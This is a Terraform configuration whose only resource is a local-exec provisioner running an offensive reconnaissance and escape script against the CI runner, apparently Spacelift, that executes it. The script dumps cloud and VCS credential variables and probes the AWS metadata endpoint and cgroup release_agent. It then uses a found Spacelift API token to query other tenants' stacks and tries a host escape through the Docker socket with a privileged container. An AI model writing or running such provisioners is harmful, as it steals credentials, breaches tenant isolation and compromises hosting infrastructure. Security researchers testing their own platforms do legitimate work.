terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "security_recon" {
  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<EOT
      echo "========================================="
      echo "[*] ENVIRONMENT VARIABLES (Credentials & OIDC)"
      echo "========================================="
      env | grep -E "AWS_|GCP_|AZURE_|SPACELIFT_|OIDC|WEB_IDENTITY|GITHUB|GITLAB|VCS" || echo "No creds found"

      echo "========================================="
      echo "[*] LINUX CAPABILITIES"
      echo "========================================="
      cat /proc/self/status | grep Cap || echo "No cap info"

      echo "========================================="
      echo "[*] CONTAINER RUNTIME FINGERPRINTING"
      echo "========================================="
      ls -la /var/run/docker.sock /run/containerd/containerd.sock /var/run/secrets/kubernetes.io/ 2>/dev/null || echo "No sockets found"

      echo "========================================="
      echo "[*] MOUNTS (Host paths)"
      echo "========================================="
      cat /proc/self/mountinfo | grep -E "/(sys|proc|docker|kubelet|var/lib|host|root)" || echo "No suspicious mounts"

      echo "========================================="
      echo "[*] CGROUP & RELEASE_AGENT"
      echo "========================================="
      cat /proc/self/cgroup | head -n 1
      find /sys/fs/cgroup -name release_agent -o -name notify_on_release 2>/dev/null | head -n 5 || echo "No cgroup release_agent"

      echo "========================================="
      echo "[*] METADATA (AWS IMDS)"
      echo "========================================="
      curl -s -m 2 --connect-timeout 2 http://169.254.169.254/latest/meta-data/ || echo "IMDS unreachable"

      echo "========================================="
      echo "[*] PROCESSES ON HOST"
      echo "========================================="
      ps aux | grep -v "spacelift\|grep" | head -n 20 || echo "No host processes visible"

      echo "========================================="
      echo "[*] WRITEABLE PATHS (Payload staging)"
      echo "========================================="
      touch /tmp/test_write 2>/dev/null && echo "/tmp is writable" || echo "/tmp not writable"
      touch /var/tmp/test_write 2>/dev/null && echo "/var/tmp is writable" || echo "/var/tmp not writable"

      echo "========================================="
      echo "[*] 🔥 ATTEMPT SPACELIFT API ABUSE (Cross-Tenant / Exfiltration)"
      echo "========================================="
      API_TOKEN="$SPACELIFT_API_TOKEN"
      if [ -n "$API_TOKEN" ]; then
        echo "[!] SPACELIFT_API_TOKEN found! Attempting GraphQL call..."
        QUERY='{"query":"{ stacks { id name space { name } } }"}'
        RESPONSE=$(curl -s -w "\nHTTP_CODE:%%{http_code}" -X POST \
          -H "Authorization: Bearer $API_TOKEN" \
          -H "Content-Type: application/json" \
          -d "$QUERY" \
          https://api.app.spacelift.dev/graphql 2>&1)
        echo "$RESPONSE" | head -c 2000
        echo ""
        echo "--- CHECKING FOR OTHER TENANTS (Spaces) ---"
        echo "$RESPONSE" | grep -o '"space":{"name":"[^"]*"}' || echo "No cross-tenant spaces found"
      else
        echo "[-] No SPACELIFT_API_TOKEN found in environment."
      fi

      echo "========================================="
      echo "[*] ATTEMPT ESCAPE via docker.sock"
      echo "========================================="
      if [ -S /var/run/docker.sock ]; then
        echo "[!] Docker socket found! Attempting to spawn privileged container..."
        docker run --rm --privileged --pid=host -v /:/host alpine chroot /host ls /root 2>&1 || echo "Escape attempt failed"
      else
        echo "[-] No docker socket. gVisor likely in use."
      fi
      echo "========================================="
      echo "[*] RECON COMPLETE. Check logs for API abuse results."
      echo "========================================="
    EOT
  }
}
